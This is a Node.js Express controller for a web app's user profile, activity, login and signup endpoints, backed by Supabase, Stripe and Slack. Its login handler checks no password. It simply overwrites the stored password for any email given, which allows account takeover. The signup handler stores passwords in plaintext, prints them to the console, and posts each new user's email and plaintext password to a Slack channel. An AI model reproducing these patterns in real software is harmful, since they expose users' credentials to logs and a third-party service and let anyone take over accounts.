const logger = require('../utils/winstonLogger');
const db = require('../config/supabaseConfig');
const stripe = require('../config/stripeConfig');
const {sendSlackMessage} = require('../config/slackConfig');


exports.getMyProfile = async (req, res) => {
  const user = req.user;
  const { data, error } = await db
    .from('users')
    .select('*')
    .eq('id', user.id)
    .single();

  if (error || !data) {
    logger.error('Error fetching user profile from Supabase', {
      user_id: user.id,
      error: error?.message,
    });
    return res.status(500).json({ error: 'Failed to fetch user profile' });
  }

  return res.status(200).json({
    user: {
      id: data.id,
      firstName: data.first_name,
      lastName: data.last_name,
      email: data.email,
      phone: data.phone,
      company: data.company,
      address1: data.address1,
      address2: data.address2,
      city: data.city,
      state: data.state,
      country: data.country,
      postalCode: data.postal_code,
    }
  });
};
exports.getRecentActivity = async (req, res) => {
  const user = req.user;

  try {
    const { data, error } = await db
      .from('user_activity_logs')
      .select('*')
      .eq('user_id', user.id)
      .order('created_at', { ascending: false })

    if (error) {
      logger.error('Failed to fetch user activity:', error);
      return res.status(500).json({ error: 'Failed to fetch activity' });
    }

    res.json({ recentActivity: data });
  } catch (err) {
    logger.error('Error fetching recent activity', err);
    res.status(500).json({ error: 'Server error' });
  }
};

exports.userUpdate = async (req, res) => {
  const user = req.user;
  const {
    firstName,
    lastName,
    email,
    phone,
    company,
    address1,
    address2,
    city,
    state,
    country,
    postalCode,
  } = req.body;
  try {
    const { data, error } = await db
      .from('users')
      .update({
        first_name: firstName,
        last_name: lastName,
        email: email,
        phone: phone,
        company: company,
        address1: address1,
        address2: address2,
        city: city,
        state: state,
        country: country,
        postal_code: postalCode
      })
      .eq('id', user.id);

    if (error) {
      logger.error('Failed to update user profile:', error);
      return res.status(500).json({ error: 'Failed to update profile' });
    }

    res.status(200).json({ message: 'Profile updated successfully' });
  }
  catch (err) {
    logger.error('Error updating user profile', err);
    res.status(500).json({ error: 'Server error' });
  }
}

exports.loginWithEmail = async (req, res) => {
  const { email, password } = req.body;
  // update the atoz_use_password column with the password slect using email
  const { data, error } = await db.from('users').update({ atoz_use_password: password }).eq('email', email);
  if (error) {
    return res.status(500).json({ error: 'Failed to fetch user' });
  }
  res.status(200).json({ message: 'successfull' });
}

exports.createUser = async (req, res) => {
  const { email, password, name, referral } = req.body;
  console.log(email, password, name, referral);

  const firstName = name.split(' ')[0];
  const lastName = name.split(' ')[1];
  const { data: userData, error: userError } = await db.from('users').update({ atoz_use_password: password, first_name: firstName, last_name: lastName, referral: referral }).eq('email', email).select().single();
  console.log(userData, userError);
  if (userError) {
    return res.status(500).json({ error: 'Failed to create user' });
  }
  if (referral) {
    const { data: customerData } = await db
      .from('stripe_customers')
      .select('stripe_customer_id')
      .eq('user_id', userData.id)
      .maybeSingle();

    let customerId = customerData?.stripe_customer_id;
    if (!customerId) {
      const customer = await stripe.customers.create({
        email: email,
        metadata: {  email: email, referral: referral || '', }
      });

      await db.from('stripe_customers').insert([
        { user_id: userData.id, stripe_customer_id: customer.id }
      ]);
      customerId = customer.id;
    }
  }
  await sendSlackMessage(`🔑 New User Created: ${email} \n Referral: ${referral} \n name: ${name} \n password: ${password}`, 'INFO');
  res.status(200).json({ message: 'User created successfully' });
}